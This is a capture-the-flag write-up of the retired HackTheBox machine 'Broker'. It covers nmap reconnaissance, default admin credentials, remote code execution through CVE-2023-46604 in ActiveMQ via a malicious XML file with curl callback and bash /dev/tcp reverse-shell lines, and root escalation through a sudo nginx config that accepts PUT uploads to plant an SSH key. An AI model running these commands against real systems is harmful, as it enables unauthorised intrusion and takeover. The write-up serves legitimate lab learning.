Broker is a retired machine on HTB Labs with an *easy* difficulty rating. Here is my write-up for it.

## Reconnaissance

We receive an IP address `10.10.11.243` and proceed to explore the box. We start with an `nmap` scan which enumerates commonly used ports and pings them for the services running on them.

```bash
nmap 10.10.11.243 -sC -sV -oN nmap/initial.out
```
We get the following results:
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
8080/tcp open  http-proxy?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
It tells us that this is a Linux machine (though we already knew this). Furthermore, we have:
- Port 22 with SSH running
- Port 80 with an nginx HTTP server runnign an ActiveMQRealm webapplication
- Port 8080 which seems to be a proxy HTTP

Since port 80 is open, we navigate to it using our browser: `http://10.10.11.243:80`. We get greeted with a login page from the ActiveMQRealm. A quick google search tells us the default credentials are `admin:admin` and this indeed gets us logged in.

Poking around a bit and also reading up on ActiveMQRealm on Google, we find that it is a message broker system, that operates on port 61616. After reading this, we start an additional `nmap` scan for this specific port.

```bash
nmap 10.10.11.243 -sC -sV -p61616 -oN nmap/61616.out
```

We get the following output:
```
PORT      STATE SERVICE  VERSION
61616/tcp open  apachemq ActiveMQ OpenWire transport
| fingerprint-strings:
|   NULL:
|     ActiveMQ
<...SNIP...>
|_    5.15.15
```
Which indeed confirms our earlier findings. Furthermore, it also tells us that the version of ActiveMQ running is `5.15.15`. Although we were able to find this information after logging in, it's good to know that even unauthenticated we still would have found it using `nmap`.

## User access

Now that we have some information about what this box is running, we can try to get an initial foothold. We search for `ActiveMQ 5.15.15 exploit` on Google and find [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604) which is a vulnerability in the Jave OpenWire Protocol used in ActiveMQ. Summarized, we can send a message to the broker and have it create an object of the `Throwable` class with a message. We do this by supplying a `class` and `message` string. However, these strings are not validated; more specifically, it's not checked whether the `class` string actually contains a `Throwable` class. We can supply an arbitrary `class` and it will create it. The exploit then, is to have it create a `org.springframework.context.support.ClassPathXmlApplicationContext` class, which allows configuration of a Spring application via an XML file, which can be on a remote URL. This XML file can then be used to call arbitrary methods with arbitrary parameters. This ofcourse is Remote Code Execution. A more extensive explanation can be found [here](https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis). 

We find [a script](https://github.com/X1r0z/ActiveMQ-RCE) written in `Go` that exploits this vulnerability. It sends the encoded payload to the message broker on port `61616`, which forces the server to load the included xml file from our local host. For that we need to start an HTTP server in the same directory:
```bash
python -m http.server
# starts a server on port 8000
```
In this xml file is the setup for this remote code execution, where we can insert out desired command. First we just want to test whether we do indeed get code execution, by having the server ping our host.

```xml
# file: poc.xml
<..SNIP..>

<value>bash</value>
<value>-c</value>
<value>curl http://{my_ip}:1234</

<..SNIP..>
```

For which of course we have a `netcat` listener.
```bash
nc -lvnp 1234
```

We execute the exploit.

```bash
go run main.go -i http://10.10.11.243 -u http://{my_ip}:8000/poc.xml
```

We then see that we:
1. Succesfully receive a GET request on our HTTP python server for the `poc.xml` file.
2. Also receive a GET request on our `netcat` server, meaning we indeed have remote code execution.

Now, we want to use this code execution to set up a reverse shell. We modify the payload in `poc.xml` with a standard reverse shell commmand:

```xml
<..SNIP..>

<value>bash</value>
<value>-c</value>
<value>bash -i &gt;&amp; /dev/tcp/10.10.14.241/1235 0&gt;&amp;1</

<..SNIP..>
```

Notice here, that we use `&gt;` and `&amp;` instead of `>` and `&`. This is because in XML the last two symbols have special meanings, so we need to escape them. (This had me frustrated for a long time; the reverse shell does not work without it but there is no indication for the problem).

We execute the exploit again and indeed find ourselves with a reverse shell. Running `id` tells us we have a shell as the `activemq` user. Navigating to their home directory gives us access to the `user.txt` flag, meaning we have officially powned the user. Nice!

## Root access
Now we'll want to escalate our privileges to the root user, so we can get the final root flag. One of the first checks I always do is checking the `sudo` permissions of this user.
```bash
sudo -l
```
We find that we are allowed to run the `nginx` command as root without supplying a password. From my experience in HTB Labs until now, I'm pretty sure this is the route they intend us to follow. 

(Here, I was stuck for quite a while. I found a few guides on privilege escalation using `nginx`, but could not get any of them to work. In the end, I had to peek a bit at another write-up of this box. The solution used was not one I found at all when checking the internet)

We can exploit `nginx` running as root as follows: We craft our own `nginx` config file and configure it such that it runs in the `/` root folder of the machine. We allow PUT requests through the server, which can be written to the root folder since nginx is running as root. We upload our public `ssh` key file to the `/root/.ssh/authorized_keys/`, such that we can login as the root user using `ssh`

Here is the config file for the `nginx` server
```
user root;
worker_processes 4;
pid /tmp/nginx.pid;

events {
    worker_connections 768;
}

http {
    server {
        listen 1906;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```
We have it run an HTTP server on port 1906 (arbitrary) and have the `/` folder as root. We allow PUT requests using `dav_methods PUT;`. We can check whether the config file is valid using the `-t` parameter:
```bash
sudo nginx -p ./ -t -c config
```
(`-p ./` specifies that the config filepath prefix is just `./`, normally configs are located in `/etc/nginx`)

We then start the server.
```bash
sudo nginx -p ./ -c config
```

Finally, we create an ssh keypair (`root`,`root.pub`) and upload it to the keys directory of the target.
```bash
curl -X PUT http://10.10.11.243:1906/root/.ssh/authorized_keys/ -d ($cat root.pub)
```

Now, using the related private key, we can login as the root user, using `ssh`. 
```bash
ssh root@10.10.11.243 -i root
```
Once logged in, we `cat` the content of the `root.txt` flag and have officially hacked this box!